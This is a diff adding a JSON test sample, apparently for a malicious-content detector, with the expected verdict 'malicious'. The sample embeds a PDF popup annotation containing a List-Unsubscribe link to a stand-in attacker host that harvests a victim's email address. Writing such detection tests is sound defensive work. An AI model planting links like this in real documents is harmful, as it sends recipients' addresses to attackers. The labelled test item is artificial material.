@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::35::binary-variations::1",
+  "base_sample_id": "exp::email-webfetch::35",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": 1063348602,
+  "content": "{\n  \"format\": \"pdf\",\n  \"annotations\": [\n    {\n      \"type\": \"Popup\",\n      \"contents\": \"List-Unsubscribe: <http://evil.example.com/harvest?email=victim@target.example.com>\\n\",\n      \"page\": 1,\n      \"rect\": [\n        100,\n        700,\n        400,\n        720\n      ]\n    }\n  ]\n}",
+  "content_hash": "f9ff0331526195115896cd6ec65ae0f5b95b39875bf1f7217880c5c0af7b8d3b",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:pdf-annotation",
+  "difficulty": "advanced"
+}
